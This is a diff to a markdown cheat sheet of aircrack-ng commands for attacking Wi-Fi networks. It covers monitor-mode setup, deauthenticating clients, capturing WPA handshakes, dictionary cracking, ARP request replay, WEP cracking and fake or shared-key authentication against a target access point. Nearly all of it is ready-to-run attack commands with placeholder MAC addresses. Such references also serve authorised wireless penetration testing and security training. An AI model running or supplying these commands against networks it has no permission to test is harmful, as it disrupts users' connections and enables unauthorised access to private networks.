@@ -1,18 +1,22 @@
 # All usage of attacks by aircrack-ng
 
 In this example
+- `wlan0` is the name of your interface in manager mode
 - `mon0` is the name of your interface in monitor mode
 - `00:14:6C:7E:40:80` is the bssid of target network
 - `00:09:5B:EB:C5:2B` is the bssid of your network
 - `-c X` is the channel of target network
-- `out` is the filename to capture the WPA handshake
+- `out.cap` is the filename to capture the WPA handshake
 - `password.txt` is the filename to brute force
 - `password.txt` is the file contains name of target network
 - `crackwpa` is the database name for cracking password
+- `sharedkey.xor` is the name of file containing the PRGA xor bits
 
 ## Scan network around
 
 ```
+airmon-ng check kill
+airmon-ng start wlan0
 airodump-ng mon0
 ```
 
@@ -35,14 +39,7 @@ Ctrl+C to stop deauth
 ```
 airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
 aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
-```
-
-## [ARP Request Replay Attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection)
-
-```
-airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
-aireplay-ng -0 10 -a 00:14:6C:7E:40:80 mon0
-aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
+ls
 ```
 
 ## [Cracking WPA/WPA2](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
@@ -54,7 +51,15 @@ aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
 aircrack-ng -w password.txt out*.cap 
 ```
 
-## Crack WEP by ARP request
+## [ARP Request Replay Attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection)
+
+```
+airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
+aireplay-ng -0 10 -a 00:14:6C:7E:40:80 mon0
+aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
+```
+
+## Crack WEP by ARP request reinjection
 
 ```
 airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
@@ -64,7 +69,7 @@ aireplay-ng -3 0 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
 aircrack-ng -a 1 out*.cap
 ```
 
-## Speed up crack with database
+## Speed up cracking use database
 
 ```
 sudo apt install sqlite3
@@ -109,13 +114,42 @@ Rebroadcast the packet and thereby generate new IVs
 aireplay-ng -2 -p 0841 -c 00:09:5B:EB:C5:2B -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82  mon0
 ```
 
+## [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication)
 
+```
+aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
+```
 
+Another variation
 
+```
+aireplay-ng -1 6000 -o 1 -q 10 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
+```
 
+## [Shared key fake authentication](https://www.aircrack-ng.org/doku.php?id=shared_key)
 
+Start interface monitor mode on AP channel
 
+```
+airmon-ng start wlan0 9
+airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w sharedkey mon0
+(wait AUTH=SKA)
+ls
+```
 
+Deauthenticate a connected client
+
+```
+aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 mon0
+```
+
+`00:0F:B5:34:30:30` is the MAC address of the client you are deauthing
+
+Perform Shared Key Fake Authentication
+
+```
+aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B -y sharedkey*.xor mon0
+```
 
 
 
